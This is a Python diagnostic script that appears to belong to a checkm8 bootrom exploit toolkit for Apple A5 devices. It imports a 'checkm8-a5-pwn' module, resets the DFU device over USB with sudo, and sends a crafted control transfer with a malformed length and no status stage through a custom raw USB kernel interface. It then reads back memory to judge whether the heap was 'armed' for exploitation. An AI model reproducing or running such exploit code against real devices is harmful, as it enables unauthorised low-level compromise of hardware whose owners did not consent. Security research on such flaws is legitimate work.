#!/usr/bin/env python3
"""critIN-diag.py — armed-quality diagnostic.

One port reset (hook recaptures at the fresh enumeration), one crit-IN
CYC (wLength 0x81, 0x41-byte data TRB, no status -> halted -> recovered),
then READBACK of the coherent buffer: did the ROM serve data into the
armed read buffer?

Verdict classes:
  - served serial bytes (utf16 'CPID:...' visible) = armed GOOD
  - zeros = armed shape wrong (the device never served into the buffer)
  - garbage/partial = heap geometry wobbly
"""
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sp = importlib.util.spec_from_file_location(
    'pwn', os.path.join(REPO, 'tools/checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

import fcntl
import ctypes

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_READBACK = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7


def cyc(fd_raw, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd_raw, IOC_CYC, txn, True)
        _ = arr
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def main():
    # 1. port reset via clean subprocess: fresh enum + hook recapture
    code = (
        "import fcntl,glob,os\n"
        "node=None\n"
        "for p in glob.glob('/sys/bus/usb/devices/*/idProduct'):\n"
        "    try:\n"
        "        if open(p).read().strip()=='1227':\n"
        "            d=os.path.dirname(p)\n"
        "            node='/dev/bus/usb/%03d/%03d'%(int(open(d+'/busnum').read()),"
        "int(open(d+'/devnum').read()))\n"
        "            break\n"
        "    except Exception: pass\n"
        "if node:\n"
        "    fd=os.open(node,os.O_RDWR)\n"
        "    try: print('reset rc:',fcntl.ioctl(fd,(0x55<<8)|20,0))\n"
        "    finally: os.close(fd)\n"
        "else: print('no DFU device')\n"
    )
    r = subprocess.run(['sudo', '-n', 'python3', '-c', code],
                       capture_output=True, text=True, timeout=45)
    print(r.stdout.strip())
    time.sleep(2.5)

    fd_raw = os.open('/dev/raw0', os.O_RDWR)
    buf = bytearray(40)
    fcntl.ioctl(fd_raw, IOC_STATE, buf, True)
    f = struct.unpack_from('<QIIIIIIII', buf, 0)
    print('[module] slot=%d state=%d' % (f[1], f[5]))
    if not f[5]:
        print('NOT CAPTURED - need re-dance or module reload')
        return 1

    # 2. THE armed crit-IN cycle
    setup = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
    rc = cyc(fd_raw, setup, b'\x00' * 0x41)
    print('[diag] crit-IN CYC rc=%d' % rc)

    # 3. READBACK the coherent buffer
    rbuf = bytearray(RB_SIZE)
    struct.pack_into('<I', rbuf, 0, 0x100)
    fcntl.ioctl(fd_raw, IOC_READBACK, rbuf, True)
    status, = struct.unpack_from('<I', rbuf, 4)
    data = bytes(rbuf[8:8 + 0x100])
    print('[diag] READBACK status=%d' % status)
    print('[diag] first 0x41 bytes: %s' % data[:0x41].hex())

    # 4. verdict
    nz = data[:0x41].strip(b'\x00')
    if len(nz) >= 4:
        try:
            txt = data[2:2 + 64].decode('utf-16-le', errors='replace')
            print('[diag] served utf16: %r' % txt[:40])
        except Exception:
            pass
        if b'C' in nz and b'P' in nz:
            print('*** VERDICT: ARMED GOOD - the ROM served serial bytes '
                  'into the armed read buffer ***')
        else:
            print('*** VERDICT: DATA SERVED (non-serial content) - armed '
                  'but content unexpected ***')
    else:
        print('*** VERDICT: ZEROS - the device did not serve into the '
              'buffer; the armed shape needs rework ***')
    os.close(fd_raw)
    return 0


if __name__ == '__main__':
    sys.exit(main())
